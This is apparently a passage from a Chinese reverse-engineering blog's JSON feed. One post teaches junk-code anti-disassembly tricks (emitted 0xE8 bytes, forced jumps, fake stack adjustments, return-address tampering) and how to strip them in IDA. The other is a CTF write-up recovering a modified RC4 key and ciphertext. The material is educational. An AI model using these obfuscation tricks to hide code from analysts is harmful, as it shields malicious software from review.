对esp进行操作\n\n必定跳转cpu的指令集规定了许多汇编指令，如0XE8表示的是call这个指令，并规定后面的几个字节是call的参数(跳转的地址)。IDA通过线性扫描从开始到结尾把每一个字节反汇编成汇编指令，例如IDA识别到了一个字节0xE8(0xE8不属于前一条汇编的参数里)，那么就把这个字节汇编成call，并把后面的字节识别成参数，然后继续往下分析。那么我们是不是可以在程序中插入一个0xE8来干扰IDA的解析呢。很明显是可以的，这就是花指令的一种实现方法。如下程序中我们用_asm{}插入一段汇编代码，并用_emit插入一个0xE8的字节码。\n__asm&#123;   jz start;   jnz start;   _emit 0xE8;&#125;start:   printf(&quot;yes&quot;);\n在上面的代码中，因为jz与jnz都是跳转到start所以程序本身就不会执行到0xE8这个位置，但是在IDA反汇编时却会被扫描出来，从而导致把我们的0xE8识别成call，把后面的字节码识别成参数，就会导致接下来的分析错误。那么构建一个花指令其实就是想帮法构建一段内联汇编，并插入一些不会被程序执行汇编指令字节码。有时候跳转会有很多次，有较多的花指令。\n通过xor eax, eax;得到结果为0，从而使zf标志为1，造成jz必然跳转。\nint main()&#123;    _asm &#123;    xor eax, eax;// eax ^ eax = 0     jz s; // 必然成立跳转，一定会跳转    add esp,1;     _emit 0x22;     _emit 0x33;     s:    &#125;\tprintf(&quot;test \\n&quot;);&#125;\n\njmp跳转$+5表示跳到当前地址后偏移5的位置\nint main()&#123;    _asm &#123;            jmp $+5        _emit 0x71        _emit 2        _emit 0xE9        _emit 0xED   &#125; lable:    printf(&quot;ok2&quot;);    return 0;&#125;\n\n解决方法:找到垃圾代码按U然后nop掉，再按C，最后再在函数开头按P创建函数。\n\n\n操作栈栈的操作是需要平衡的，一个入栈后面必要一个出栈平衡，但是如果我们不用pop出栈，那么IDA可能就会识别到栈的不平衡而无法反编译。\n不执行的栈操作在下面的代码中我们插入了对栈顶进行操作的操作码，实际上因为永恒跳转的原因，这个操作是不会执行的，但是如果被ida识别到，那么就会认为栈是不平衡的，从而导致上面的问题。\nint main() &#123;\t\tint main()&#123;    _asm &#123;    xor eax, eax;// eax ^ eax = 0     jz s; // 必然成立跳转，一定会跳转    add esp,0x100;   //操作栈顶指针，实际上不会执行    _emit 0x22;     _emit 0x33;     s:    &#125;\tprintf(&quot;test \\n&quot;);&#125;start:\tprintf(&quot;hello world&quot;);&#125;\n\n我们在option中的general中右上角勾选Starck pointer和设置number of byte 为8。来显示字节码和栈指针以便我们分析。\n\n我们可以轻易发现我们写的花指令，发现ida已经识别到了栈顶指针的异常，这个时候我们只要把add的那个操作码nop掉就行。\n\n会执行的栈操作在下面的代码中我们push了寄存器eax，这回让esp-4然后再把eax的值放入esp指向的地址中，正常来说，我们在后面要pop eax(把esp指向地址的值赋值给eax再把esp+4)来平衡栈，但是我们这里直接用mov来操作esp来平衡，这就会导致ida识别到栈不平衡的问题。\nint main() &#123;        __asm &#123;        push eax;        add esp, 4;    &#125;start:    printf(&quot;hello world&quot;);&#125;\n\n这个花指令在高版本的IDA（IDA9）中好像已经不管用了，如果有这种花指令的话直接nop就行。\nCALL&#x2F;RET跳转call在执行时会把返回地址入栈，并跳转到函数执行，但是如果在后面的过程中修改这个返回地址，那么当ret返回的时候就会跳转到其他的方执行。如下代码实现了这种效果，这会增加我们的分析难度，但本质还是跳转，nop掉垃圾数据就行。可以直接把call和ret部分全nop掉。\n__asm &#123;    call a;    _emit 0xE8;a:    add dword ptr ss:[esp], 0x1; //表示以四字节(dword)写入栈段(ss)到esp指向的值(ptr表示把后面的数当成指针使用)    ret;\n\n","categories":["Re学习"],"tags":["re,学习"]},{"title":"2024软件创新大赛部分Re-wp","url":"/2025/01/06/%E8%BD%AF%E4%BB%B6%E5%88%9B%E6%96%B0%E5%A4%A7%E8%B5%9B/","content":"主函数在start的第一个参数里面。去除如下花指令\n\n一个rc4加密，密钥在第一个生成盒函数的参数里。第二个函数是加密函数，动调密钥会被修改。\n\n在第二个函数的call处下断点动调就可以看到加密函数，进入加密函数后发现花指令，和上面一样的nop掉后可以发现魔改RC4。\n\n\n我们输入一串字符进行动调，在主函数的unk_5C6CC0中下硬件断点。后面会断在如下位置,这里就是比较的位置。去除这里的花指令后就可以看到逻辑，密文就是上面这些。所有数据都已经拿到，记得把密文转一下端序（见python脚本）,最后还有一个异或0x23。\n密文:25cd54af511c58d3a84b4f56ec835dd4f6474a6fe073b0a5a8c317815e2bf4f671ea2fffa8639957\n密钥:921C2B1FBAFBA2FF07697D77188C\n\n\na = [0x0D3581C51AF54CD25,0x0D45D83EC564F4BA8,0x0A5B073E06F4A47F6,0x0F6F42B5E8117C3A8,0x579963A8FF2FEA71]b=&quot;&quot;for i in a:    b += i.to_bytes(8,&#x27;little&#x27;).hex()print(f&quot;&#123;b&#125;&quot;,end=&#x27;&#x27;)\n\n方法2，不去花指令的动调获取,需要汇编基础，当作汇编和动调练习了。\n首先我们寻找输入输入数据的位置，可以单步进入函数看从什么位置开始读取数据，当然这很麻烦，万不得已还是别了吧。接下来我们用更简单一点的方法进行定位，首先我们调试直接运行到输入数据的时候，程序会等待我们的输入，这时我们用ida的trace来寻找输入函数。按下图打开栈追踪，\n\n进行函数追踪\n\n这个时候程序会断在一个位置，一般这个位置就是输入数据的前一个位置，在断下的位置(EIP)下断点（总之下的断点要把程序停在附近，不能让程序结束），单步运行到程序等待输入，然后输入数据。用Call stack可以看函数调用的顺序，寻找出主函数和加密函数，不过暂时用不到。\n\n其实我们也可以发现①就是一个读取函数，我们的程序断在了断点处，并且我们往上分析就可以看到我们输入的数据，这个时候我们就可以下一个硬件断点在输入的数据上，继续动调，下断点的时候建议多下几个，最少头尾两个，这样更好分析。我们接下来运行程序，分析汇编。\n\n我们运行下去就会发现我们会在一个函数里面循环，分析一下，好像是把我们的输入转存到rbx-1里面去了，我们进入，继续给数据下硬件断点。\n\n\n我们可以发现这个变量是有名字的，我们对这个变量进行引用查看，就会到一个函数如下图，这个函数里面有一个%s。上面是我们输入的数据，下面有个%s，想都不用想，下一个call就是输入函数scanf，所以这里大概就是主函数了。\n\n如下图，继续看引用可以看到上面有一个别的变量好像存储了一些数据，感觉是密文，先记下来。我们可以看到我们的输入数据被加载到了rdi中，然后call了一个r8函数(猜不出来也没问题，可以继续用硬件断点分析)，估计这个函数就是处理数据的函数。我们给call下一个断点，继续运行程序。发现下一步直接到了call这里，继续运行。\n\n如下图，我们会进入一个函数循环中，这就是加密主逻辑了，看到&amp;255你能想到什么?没错，就是RC4。单步分析这个循环，我们还可以发现RC4的表，以及还有一个异或0x23。在最后我们在返回处下一个断点单步运行，发现返回的位置就是Call r8的位置，那么这就是RC4加密函数。我们可以知道，RC4前面的一个函数一般就是用密钥生成盒，而且正好在我们call r8的上面刚还有一个call r8，而且上面刚好也加载了一个变量，没错，这就是我们之前记下的密钥。\n\n继续往下运行，我们到了一个比较函数，上面有一大串的数据，我们加密后的密文也在cmp处进行比较，右侧就是密文。至此，分析结束，我们开始解密。结束了吗？还没有，我们拿到的密钥被反调试修改了，我们要在没有调试的情况下获取密钥，就在我们记下的那个变量里。这样就可以正确解密了，解密参照方法1.\n\n","categories":["WriteUp"],"tags":["re,WriteUp"]}]